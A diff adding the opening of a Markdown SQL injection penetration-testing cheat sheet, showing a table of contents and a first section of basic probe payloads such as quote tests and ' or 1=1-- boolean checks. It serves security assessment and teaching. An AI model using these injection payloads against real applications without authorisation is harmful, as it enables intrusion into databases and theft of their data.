@@ -1,3 +1,41 @@
+# SQL Injection Penetration Testing Cheat Sheet
+
+A comprehensive reference guide for SQL injection testing during security assessments and penetration testing.
+
+## 📋 Table of Contents
+- [Initial Discovery](#initial-discovery)
+- [Error-Based Detection](#error-based-detection)
+- [Union-Based Injection](#union-based-injection)
+- [Blind SQL Injection](#blind-sql-injection)
+- [Time-Based Blind Injection](#time-based-blind-injection)
+- [Information Gathering](#information-gathering)
+- [Filter Bypass Techniques](#filter-bypass-techniques)
+- [Database-Specific Payloads](#database-specific-payloads)
+- [Prevention & Mitigation](#prevention--mitigation)
+
+---
+
+## 🔍 Initial Discovery
+
+### Basic Parameter Testing
+Test parameters for SQL injection vulnerabilities using these payloads:
+
+```sql
+-- Single quote test (triggers SQL syntax error)
+param='
+
+-- Double quote test
+param="
+
+-- Basic boolean test (should return data)
+param=' or 1=1--
+
+-- False condition test (should return no data)
+param=' or 1=0--
+
+-- AND condition test
+param=' and 1=1--
+
 Note: For GET requests, remember to URL encode special characters.
 
 Quick Validation Tests
